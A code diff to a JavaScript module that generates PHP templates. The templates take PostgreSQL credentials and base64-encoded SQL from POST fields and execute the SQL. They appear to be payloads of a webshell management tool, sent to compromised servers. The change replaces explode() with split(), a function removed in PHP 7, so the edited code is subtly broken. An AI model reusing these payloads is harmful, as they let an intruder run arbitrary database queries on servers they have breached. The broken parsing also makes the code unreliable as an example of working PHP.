@@ -10,11 +10,14 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
       $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
-      $host=explode(':',$hst)[0];
-      $port=explode(':',$hst)[1];
+      list($host, $port,$dbn) = split(":", $hst);
+      $port == "" ? $port = "5432" : $port;
+      $dbn == "" ? $dbn = "postgres" : $dbn;
+
       $arr=array(
         'host'=>$host,
         'port'=>$port,
+        'dbname'=>$dbn
       );
       $cs='pgsql:';
       foreach($arr as $k=>$v) {
@@ -46,8 +49,8 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
-      $host=explode(':',$hst)[0];
-      $port=explode(':',$hst)[1];
+      list($host, $port) = split(":", $hst);
+      $port == "" ? $port = "5432" : $port;
       $arr=array(
         'host'=>$host,
         'port'=>$port,
@@ -85,8 +88,8 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $tab=$m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"];
-      $host=explode(':',$hst)[0];
-      $port=explode(':',$hst)[1];
+      list($host, $port) = split(":", $hst);
+      $port == "" ? $port = "5432" : $port;
       $arr=array(
         'host'=>$host,
         'port'=>$port,
@@ -127,8 +130,8 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
       $sql=base64_decode($_POST["${arg5}"]);
       $encode=$m?stripslashes($_POST["${arg6}"]):$_POST["${arg6}"];
-      $host=explode(':',$hst)[0];
-      $port=explode(':',$hst)[1];
+      list($host, $port) = split(":", $hst);
+      $port == "" ? $port = "5432" : $port;
       $arr=array(
         'host'=>$host,
         'port'=>$port,
